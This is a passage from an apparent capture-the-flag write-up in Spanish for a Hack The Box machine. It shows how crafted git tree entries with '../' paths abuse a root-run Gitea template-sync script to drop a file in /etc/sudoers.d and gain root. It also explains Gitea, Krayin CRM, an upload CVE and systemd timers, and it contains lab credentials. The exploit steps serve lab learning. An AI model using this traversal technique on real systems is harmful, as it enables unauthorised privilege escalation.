os.makedirs(os.path.join(".git", "refs", "heads"), exist_ok=True)
open(os.path.join(".git", "refs", "heads", "main"), "w").write(sha + "\n")
print("commit:", sha)
```

Este script crea el `blob` con nuestra regla de `sudo`, los árboles anidados con `..` y el *commit* final.

Antes de ejecutarlo debemos preparar el repositorio destino. Gitea solo sincroniza los repos marcados como _template_, así que lo creamos desde la propia interfaz web: **New Repository** en el Gitea de `jones`, con nombre `pwn-template`, y en esa misma pantalla de creación marcamos la casilla **Make repository a template**:

![[crear repositorio.png]]

Una vez creemos el repositorio, debemos clonarlo:

```bash
git clone http://jones:y27xb3ha!!74GbR@git.nexus.htb/jones/pwn-template.git

cd pwn-template

# Ejecutamos el script
python3 exploit.py

git ls-tree -r HEAD

100644 blob f27766ee83dd89926dfd9fffe24ea00d179e5845	README.md
100644 blob 363212f744e242988c87a3fc0ca391bd53b2ae0b	../../../../../../etc/sudoers.d/pwn
```

Ahora realizamos el `push`, para el cual seguramente requiramos un token:

```bash
git push -u origin main --force

remote: Failed to authenticate user
fatal: Authentication failed for 'http://git.nexus.htb/jones/pwn-template.git/'
```

Para ello, volvemos a ***Gitea*** y pulsamos en ***Settings > Applications*** le damos un nombre al token, le damos acceso a todo y creamos el token. Para usarlo:

```bash
git remote set-url origin http://jones:$(cat token_git)@git.nexus.htb/jones/pwn-template.git

# Ahora si podremos hacer el push
git push -u origin main --force
```

Al pasar 60 segundos se activará el servicio de Gitea y escribirá el archivo en `/etc/sudores.d/pwn`. De esta forma podremos ejecutar cualquier comando sin introducir si quiera la contraseña.

```bash
jones@nexus:~$ sudo su
root@nexus:/home/jones#
```

---

# Explicaciones

## Gitea

**Gitea** es una plataforma de control de versiones Git autohospedada (_self-hosted_), de código abierto y extremadamente ligera.

En términos sencillos: es como tener nuestro propio **GitHub** o **GitLab** privado, pero funcionando dentro de nuestra propia máquina o servidor.

### Puntos clave:

- **Muy ligera y rápida:** Está escrita en **Go**, lo que le permite compilarse en un único binario ejecutable. Consume muy poca memoria RAM y CPU (puede correr perfectamente en una Raspberry Pi o en una máquina modesta de laboratorio).
    
- **Bases de datos flexibles:** Puede funcionar con SQLite (muy habitual en máquinas de CTF porque no requiere configurar un gestor externo), MySQL, PostgreSQL o MariaDB.
    
- **Interfaz clon de GitHub:** Proporciona un panel web muy familiar para gestionar repositorios, ver *diffs* de *commits*, gestionar ramas, *issues*, *pull requests* y wikis.
    
- **Soporte de CI/CD:** En versiones recientes incluye **Gitea Actions**, un sistema de automatización compatible con la sintaxis de flujos de trabajo (_workflows_) de GitHub Actions.
    
- **Origen:** Nació a finales de 2016 como un _fork_ comunitario de **Gogs** (otro gestor Git en Go) para asegurar un modelo de desarrollo abierto y colaborativo.
    

**Relevancia en hacking ético y CTFs (como Hack The Box):**

En auditorías y máquinas de HTB, Gitea aparece con mucha frecuencia por varias razones:

1. **Fugas de credenciales:** Es común encontrar usuarios que olvidan código sensible en repositorios públicos/privados (`.env`, llaves SSH, contraseñas hardcodeadas o historial de commits).
    
2. **Vulnerabilidades conocidas:** Distintas versiones han tenido CVEs críticos de ejecución remota de comandos (RCE), inyecciones de comandos en hooks de Git, o autenticaciones defectuosas en la API.
    
3. **Abuso de Git Hooks:** Si consiguimos permisos de administrador (o creación de repositorios con hooks habilitados), los _server-side hooks_ (como `post-receive` o `pre-receive`) permiten ejecutar scripts arbitrarios en el servidor cada vez que hacemos un `git push`, facilitando la obtención de una reverse shell.

---

## Krayin

***Krayin CRM*** es un sistema de gestión de relaciones con clientes (*Customer Relationship Managment*) de código abierto y gratuito, diseñado principalmente para pequeñas y medianas empresas.

### Arquitectuta técnica

- **Framework base:** Está desarrollado sobre **PHP** utilizando el framework **Laravel**, lo que le otorga una arquitectura MVC modular y limpia.
    
- **Componentes visuales:** Su frontend hace un uso intensivo de **Vue.js**, lo que agiliza la interfaz de usuario en paneles de control y vistas de pipelines.
    
- **Bases de datos:** Es compatible con bases de datos relacionales estándar del ecosistema PHP, habitualmente **MySQL** o **MariaDB**.
    
- **Ecosistema:** Fue creado y es mantenido por la compañía **Webkul** (conocidos también por otros proyectos open source como Bagisto para e-commerce).
    

### Funcionalidades principales

- **Gestión de Leads y Oportunidades:** Visualización de embudos de ventas en formato Kanban (_Sales Pipelines_).
    
- **Gestión de contactos:** Directorio de organizaciones, personas de contacto y seguimiento de interacciones (llamadas, correos, notas).
    
- **Control de accesos (ACL):** Sistema de roles y permisos granulares para empleados y equipos de ventas.
    
- **Flujos de trabajo automatizados:** Disparadores y acciones automáticas para el seguimiento de clientes y correos.
    

### Relevancia en auditorías y CTFs (como Hack The Box)

Al estar construido sobre Laravel, en auditorías web y retos de laboratorio Krayin suele analizarse a través de vectores típicos del stack:

- **Archivos `.env` expuestos:** Si la raíz web está mal configurada o hay un _Local File Inclusion_ (LFI), el archivo `.env` expone la clave `APP_KEY` de Laravel (que en versiones vulnerables o con deserialización puede llevar a RCE) y credenciales de base de datos.
    
- **Vulnerabilidades de subida de archivos (File Upload):** Puntos donde un usuario con ciertos privilegios en el CRM puede subir avatares, adjuntos o documentos en cotizaciones que puedan derivar en subida de webshells.
    
- **Inyecciones SQL / CSRF / XSS:** En módulos de gestión de campos personalizados o formularios públicos de captación de leads.
    
- **CVEs específicos de versión:** Versiones desactualizadas de Krayin o de dependencias en su `composer.json` con vulnerabilidades públicas de ejecución de comandos remotos (RCE).

## CVE-2026-38526

>***CVE-2026-38526*** es una vulnerabilidad crítica 9con una puntuación CVSS de *9.9/10*) de ejecución remota de código (*RCE*) que afecta a ***Webkul Crayin CRM v2.2.x***.

- **Tipo de fallo:** Carga de archivos arbitrarios sin restricciones (**CWE-434** / _Unrestricted Upload of File with Dangerous Type_).
    
- **Componente afectado:** El endpoint del manejador de subida de archivos de ***TinyMCE*** ubicado en `/admin/tinymce/upload`.
    
- **Vector de ataque:** Requiere acceso autenticado con privilegios al panel de administración. Un atacante con estas credenciales puede eludir las validaciones de tipo y extensión de archivo para subir un script de PHP malicioso directamente al servidor.
    
- **Impacto:** Una vez subido el archivo, el atacante puede acceder a él a través de una petición HTTP estándar para ejecutar comandos de forma arbitraria en el servidor subyacente, comprometiendo por completo la confidencialidad, integridad y disponibilidad del sistema.

### Mitigaciones y recomendaciones técnicas

- **Validación en el servidor:** Asegurar que el endpoint implemente listas blancas estrictas (_allowlist_) de extensiones y tipos MIME permitidos, bloqueando tajantemente extensiones ejecutables como `.php`.
    
- **Ubicación de almacenamiento:** Aislar el directorio de subidas de archivos fuera del alcance web directo o deshabilitar la ejecución de scripts dentro de dichas rutas.
    
- **Control de privilegios:** Auditar el acceso a las cuentas con permisos administrativos para mitigar el riesgo de abuso interno o credenciales comprometidas.

---

## Timers de systemd

Los ***timers de systemd*** son unidades (`.timer`) que programa la ejecución de una unidad de servicio (`.service`) en momentos o intervalos específicos. Son la alternativa a `cron` integrada en `systemd`.

Funcionan siempre en pareja:

|     *Archivo*      |                     *Rol*                     |
| :----------------: | :-------------------------------------------: |
|  `mi-tarea.timer`  |        Define ***cuándo*** se ejecuta         |
| `mi-tarea.service` | Define ***qué*** se ejecuta (`ExecStart=...`) |

Por defecto, `mi-tarea.timer` activa `mi-tarea.service` (mismo nombre, sufijo distinto).

### Tipos de timers

- ***Real-time (`OnCalendar=`):*** Basado en el reloj del sistema, como `cron`.

```INI
[Timer]
OnCalendar=*-*-* 03:00:00    # todos los días a las 03:00
```

- ***Monotic (`OnBootSec=`, `OnUnitActiveSec=`, etc):*** Basado en un intervalo de tiempo desde un evento (arranque, última ejecución, etc).

```INI
[Timer]
OnBootSec=5min
OnUnitActiveSec=1h        # cada hora desde la última ejecución
```

### Ventajas sobre `cron`

- **`Persistent=true`**: si el sistema estaba apagado en la hora programada, ejecuta la tarea al arrancar (como `anacron`). 
    
- **Logging** en `journald` → `journalctl -u mi-tarea.service`
    
- **`RandomizedDelaySec=`**: retraso aleatorio para evitar picos de carga. 
    
- **Precisión de segundos** (cron solo permite minutos). 
    
- Integración con cgroups, dependencias entre unidades, etc.

### Comandos útiles

```
systemctl list-timers              # ver timers activos
systemctl list-timers --all        # todos (incluidos inactivos)
systemctl start mi-tarea.timer     # activar
systemctl enable mi-tarea.timer    # que arranque con el sistema
journalctl -u mi-tarea.service     # ver logs de la última ejecución   
```

---

## template-sync.py

### 1. Las Variables Globales

Al principio del script vemos esto:

```python
GITEA_URL = "http://localhost:3000"
REPO_ROOT = "/var/lib/gitea/data/gitea-repositories"
STAGING_DIR = "/home/git/template-staging"
```

Esto define el entorno de trabajo del script. Le dice que Gitea corre de froma local en el puerto `3000`, que los repositorios crudos (*bare repos*) están en `REPO_ROOT`m y que el directorio donde va a volcar/copiar los archivos es `STAGING_DIR` (nuestro objetivo a escapar).

### 2. La función `main()`

Si nos vamos al final del script, vemos la función `main()`. Este es el orden en el que hace las cosas:

```Python
def main():
    log("Template sync starting")

    # 1. Obtiene una contraseña/token de los archivos de configuración del sistema
    token = get_token()
    if not token:
        log("No API token found")
        sys.exit(1)

    # 2. Le pregunta a la API de Gitea: "¿Qué repositorios están marcados como plantilla?"
    templates = get_template_repos(token)
    log("Found %d template repo(s)" % len(templates))

    # 3. Por cada repositorio que sea plantilla, ejecuta la función de sincronización
    for repo in templates:
        name = repo['full_name']
        log("Syncing template: %s" % name)
        sync_template(repo) # <-- Aquí es donde ocurre la acción
```

### 3. `sync_template(repo)`

```JSON
{
  "ok": true,
  "data": [
    {
      "id": 1,
      "owner": {
        "id": 1,
        "login": "admin",
        "login_name": "",
        "source_id": 0,
        "full_name": "",
        "email": "admin@nexus.htb",
        "avatar_url": "http://git.nexus.htb/avatars/b17d58524b633e08762e81cb2727e6ee",
        "html_url": "http://git.nexus.htb/admin",
        "language": "",
        "is_admin": false,
        "last_login": "0001-01-01T00:00:00Z",
        "created": "2026-04-23T11:44:27Z",
        "restricted": false,
        "active": false,
        "prohibit_login": false,
        "location": "",
        "website": "",
        "description": "",
        "visibility": "public",
        "followers_count": 0,
        "following_count": 0,
        "starred_repos_count": 0,
        "username": "admin"
      },
      "name": "krayin-docker-setup",
      "full_name": "admin/krayin-docker-setup",
      "description": "",
      "empty": false,
      "private": false,
      "fork": false,
      "template": false,
      "mirror": false,
      "size": 30,
      "language": "",
      "languages_url": "http://git.nexus.htb/api/v1/repos/admin/krayin-docker-setup/languages",
      "html_url": "http://git.nexus.htb/admin/krayin-docker-setup",
      "url": "http://git.nexus.htb/api/v1/repos/admin/krayin-docker-setup",
      "link": "",
      "ssh_url": "git@git.nexus.htb:admin/krayin-docker-setup.git",
      "clone_url": "http://git.nexus.htb/admin/krayin-docker-setup.git",
      "original_url": "",
      "website": "",
      "stars_count": 0,
      "forks_count": 0,
      "watchers_count": 1,
      "branch_count": 1,
      "open_issues_count": 0,
      "open_pr_counter": 0,
      "release_counter": 0,
      "default_branch": "main",
      "archived": false,
      "created_at": "2026-04-23T18:02:12Z",
      "updated_at": "2026-04-23T18:05:24Z",
      "archived_at": "1970-01-01T00:00:00Z",
      "permissions": {
        "admin": false,
        "push": false,
        "pull": true
      },
      "has_code": true,
      "has_issues": true,
      "internal_tracker": {
        "enable_time_tracker": true,
        "allow_only_contributors_to_track_time": true,
        "enable_issue_dependencies": true
      },
      "has_wiki": true,
      "has_pull_requests": true,
      "has_projects": true,
      "projects_mode": "all",
      "has_releases": true,
      "has_packages": true,
      "has_actions": true,
      "ignore_whitespace_conflicts": false,
      "allow_merge_commits": true,
      "allow_rebase": true,
      "allow_rebase_explicit": true,
      "allow_squash_merge": true,
      "allow_fast_forward_only_merge": true,
      "allow_rebase_update": true,
      "allow_manual_merge": false,
      "autodetect_manual_merge": false,
      "default_delete_branch_after_merge": false,
      "default_merge_style": "merge",
      "default_allow_maintainer_edit": true,
      "avatar_url": "",
      "internal": false,
      "mirror_interval": "",
      "object_format_name": "sha1",
      "mirror_updated": "0001-01-01T00:00:00Z",
      "topics": [],
      "licenses": []
    }
  ]
}
```

#### 3.1. Definiendo las rutas

Lo primero que hace la función es construir las rutas de las carpetas basándose en el nombre del dueño del repositorio (`owner`) y el nombre del repositorio (`name`):

```python
owner = repo_info['owner']['login']
name = repo_info['name'].lower()
bare_path = os.path.join(REPO_ROOT, owner, "%s.git" % name)
stage_path = os.path.join(STAGING_DIR, owner, name)
```

Siguiendo la respuesta que se ha obtenido de `http://git.nexus.htb/api/v1/repos/search` si tuviera el campo `template: true`:

- `bare_path` será: `/var/lib/gitea/data/gitea-repositories/admin/krayin-docker-setup.git` (Aquí es donde Gitea guarda el código crudo).

- `stage_path` será: `/home/git/template-staging/admin/krayin-docker-setup` (Aquí es donde el script va a copiar los archivos).

#### 3.2. Listando los archivos del repositorio

En lugar de hacer un `git clone` normal, el script le pregunta directamente a la base de datos interna de Git qué archivos hay en la rama principal (`HEAD`). Para ello ejecuta un comando del sistema con `subprocess.run`:

```python
# Lee las entradas del tree del repositorio crudo
    try:
        GIT = ['git', '-c', 'safe.directory=*']
        result = subprocess.run(
            GIT + ['ls-tree', '-r', 'HEAD'],
            cwd=bare_path,
            capture_output=True, text=True, timeout=10
        )
```

El comando que se ejecuta por debajo es `git ls-tree -r HEAD`. Este comando es fundamental entenderlo. Lo que hace es listar de forma recursiva (recorriendo todas las carpetas) todo el contenido del commit actual.

>El output de este comando tiene este formato: `100644 blob f27766e... README.md` *(Permisos | Tipo de objeto | Hash del archivo | Ruta del archivo)*

#### 3.3. Guardando la lista de archivos

A continuación, el script procesa la salida de ese comando línea por línea para extraer la información:

```python
entries = []
    for line in result.stdout.strip().split('\n'):
        # ... (código de comprobación de errores omitido para resumir) ...
        parts = line.split('\t', 1)
        meta, filepath = parts
        mode, objtype, objhash = meta.split()
        
        if objtype == 'blob':
            entries.append((mode, objhash, filepath))
```

El script separa cada línea usando el tabulador (`\t`). Se queda con los permisos (`mode`), el identificador único del archivo (`objhash`) y la ruta/nombre del archivo (`filepath`). Si el objeto es un archivo (`blob`), lo guarda en una lista llamada `entries`.

#### 3.4. La construcción de la ruta (El fallo de seguridad)

El script recorre cada archivo de la lista y calcula dónde debe guardarlo:

```python
# Extrae los archivos al staging directory
    for mode, objhash, filepath in entries:
        target = os.path.join(stage_path, filepath)
        target_dir = os.path.dirname(target)
        
        try:
            os.makedirs(target_dir, exist_ok=True)
```

>[!warning]
>La línea letal aquí es `target = os.path.join(stage_path, filepath)`.
>
>En Python, `os.path.join` sirve para unir rutas de forma segura _en teoría_. Une `/home/git/template-staging/admin/krayin-docker-setup` con el `filepath` (por ejemplo, `README.md`). El problema de `os.path.join` es que **no sanea ni elimina los caracteres `../`** (que en Linux significan "sube una carpeta hacia atrás").
>
>Si nosotros logramos que el `filepath` que nos devuelve Git sea literalmente `../../../../../../etc/sudoers.d/pwn`, la ruta resultante en la variable `target` será: `/home/git/template-staging/admin/krayin-docker-setup/../../../../../../etc/sudoers.d/pwn`

#### 3.5. Extrayendo el contenido

Una vez que el script sabe _dónde_ va a guardar el archivo (su variable `target`), necesita saber _qué_ va a guardar.

Para eso, usa otro comando interno de Git (`git cat-file`) pasándole el hash del archivo (`objhash`). Esto le devuelve el contenido real del archivo:

```Python
GIT = ['git', '-c', 'safe.directory=*']
cat_result = subprocess.run(
    GIT + ['cat-file', 'blob', objhash],
    cwd=bare_path,
    capture_output=True, timeout=10
)
```

#### 3.6. Escribiendo como `root`

Finalmente, con el destino y el contenido listos, el script procede a crear el archivo:

```Python
with open(target, 'wb') as f:
    f.write(cat_result.stdout)
```

Cuando la función `open()` de Python intenta abrir la ruta llena de `../`, se la pasa directamente al sistema operativo (Linux). Linux procesa esos `../`, sube de directorio tantas veces como le hemos indicado, escapa de la carpeta `/home/git/...` y termina escribiendo el archivo en `/etc/sudoers.d/pwn`.

Como este script Python completo ha sido invocado por el `systemd timer` con privilegios de **root**, la escritura en la carpeta protegida `/etc/sudoers.d/` tiene éxito.

### Resumen de la jugada completa en este script

1. Lee los repositorios marcados como "*Template*".
    
2. Lista sus archivos con `git ls-tree`.
    
3. Une la carpeta de destino con el nombre del archivo SIN verificar si el nombre es malicioso.
    
4. Extrae el contenido y lo guarda.
